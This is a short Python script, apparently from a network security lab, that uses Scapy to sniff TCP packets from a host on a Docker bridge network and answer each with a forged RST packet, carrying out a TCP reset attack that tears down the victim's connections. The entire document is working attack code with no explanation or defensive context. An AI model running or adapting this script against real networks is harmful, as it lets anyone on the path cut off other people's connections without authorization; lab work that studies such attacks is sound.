from scapy.all import*

def spoof(pkt):
    ip = IP(src = pkt[IP].src, dst = pkt[IP].dst)
    tcp = TCP(sport = pkt[TCP].sport, dport  = pkt[TCP].dport, flags = 'R', seq = pkt[TCP].seq+1)
    pkt_new = ip/tcp
    ls(pkt_new)
    send(pkt_new,verbose = 0)

pkt = sniff(iface = 'br-fd88467e4c1d',filter = 'tcp and src host 10.9.0.5 and(not ether src 02:42:f7:15:0d:43) ', prn = spoof)